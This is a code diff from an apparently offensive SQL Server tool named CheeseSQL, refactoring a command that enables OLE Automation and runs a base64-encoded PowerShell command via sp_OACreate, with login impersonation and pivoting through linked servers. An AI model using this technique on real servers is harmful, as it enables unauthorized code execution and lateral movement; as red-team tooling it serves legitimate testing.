@@ -12,60 +12,53 @@ namespace CheeseSQL.Commands
 
         public string Description()
         {
-            return $"[*] {CommandName}\r\n" +
-                   $"  Description: Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'";
+            return $"Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'";
         }
 
         public string Usage()
         {
-            return $"{Description()}\r\n  " +
-                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
-                $"/db:DATABASE " +
-                $"/server:SERVER " +
-                $"/command:COMMAND " +
-                $"[/impersonate:USER] " +
-                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
+            return $@"{Description()} 
+Required arguments:
+  /server:SERVER                   Server to connect to
+  /command:<B64-PWSH>              Command to execute
+
+Optional arguments:
+  /target:TARGET                   Specify a linked SQL server as the target
+  /db:DB                           Specify an alternate database to connect 
+  /impersonate:USER                Impersonate a user on the connect server
+  /impersonate-intermediate:USER   Impersonate a user on the intermediate server
+  /impersonate-linked:USER         Impersonate a user on the target server
+  /sqlauth                         If set, use SQL authentication
+    /user:SQLUSER                  If /sqlauth, set the user for SQL authentication
+    /password:SQLPASSWORD          If /sqlauth, set the password for SQL authentication";
         }
 
         public void Execute(Dictionary<string, string> arguments)
         {
 
             string connectInfo = "";
-            string database = "";
-            string connectserver = "";
-            string intermediate = "";
-            string target = "";
-            string impersonate = "";
-            string impersonate_intermediate = "";
-            string impersonate_linked = "";
             string cmd = "";
 
-            bool sqlauth = arguments.ContainsKey("/sqlauth");
+            ArgumentSet argumentSet;
+            try
+            {
+                argumentSet = ArgumentSet.FromDictionary(
+                    arguments,
+                    new List<string>() {
+                        "/server",
+                        "/command"
+                    });
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[x] Error: {e.Message}");
+                return;
+            }
 
-            arguments.TryGetValue("/impersonate", out impersonate);
-            arguments.TryGetValue("/intermediate", out intermediate);
-            arguments.TryGetValue("/target", out target);
-            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
-            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);
-
-            if (!arguments.TryGetValue("/db", out database))
-            {
-                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
-                return;
-            }
-            if (!arguments.TryGetValue("/server", out connectserver))
-            {
-                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
-                return;
-            }
-            if (!arguments.TryGetValue("/command", out cmd))
-            {
-                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
-                return;
-            }
+            argumentSet.GetExtraString("/command", out cmd);
 
             SqlConnection connection;
-            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
+            SQLExecutor.ConnectionInfo(arguments, argumentSet.connectserver, argumentSet.database, argumentSet.sqlauth, out connectInfo);
             if (String.IsNullOrEmpty(connectInfo))
             {
                 return;
@@ -77,9 +70,9 @@ namespace CheeseSQL.Commands
 
             var procedures = new Dictionary<string, string>();
 
-            if (!String.IsNullOrEmpty(impersonate))
+            if (!String.IsNullOrEmpty(argumentSet.impersonate))
             {
-                procedures.Add($"Attempting impersonation as {impersonate}..", $"EXECUTE AS LOGIN = '{impersonate}';");
+                procedures.Add($"Attempting impersonation as {argumentSet.impersonate}..", $"EXECUTE AS LOGIN = '{argumentSet.impersonate}';");
             }
 
             procedures.Add("Enabling OLE Automation Procedures..", $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;");
@@ -90,17 +83,31 @@ namespace CheeseSQL.Commands
             {
                 Console.WriteLine("[*] {0}", step);
 
-                if (String.IsNullOrEmpty(target) && String.IsNullOrEmpty(intermediate))
+                if (String.IsNullOrEmpty(argumentSet.target) && String.IsNullOrEmpty(argumentSet.intermediate))
                 {
                     SQLExecutor.ExecuteProcedure(connection, procedures[step]);
                 }
-                else if (String.IsNullOrEmpty(intermediate))
+                else if (String.IsNullOrEmpty(argumentSet.intermediate))
                 {
-                    SQLExecutor.ExecuteLinkedProcedure(connection, procedures[step], target, impersonate, impersonate_linked);
+                    SQLExecutor.ExecuteLinkedProcedure(
+                        connection, 
+                        procedures[step],
+                        argumentSet.target,
+                        argumentSet.impersonate,
+                        argumentSet.impersonate_linked
+                        );
                 }
                 else
                 {
-                    SQLExecutor.ExecuteDoubleLinkedProcedure(connection, procedures[step], target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
+                    SQLExecutor.ExecuteDoubleLinkedProcedure(
+                        connection, 
+                        procedures[step], 
+                        argumentSet.target,
+                        argumentSet.intermediate,
+                        argumentSet.impersonate,
+                        argumentSet.impersonate_linked,
+                        argumentSet.impersonate_intermediate
+                        );
                 }
             }
 
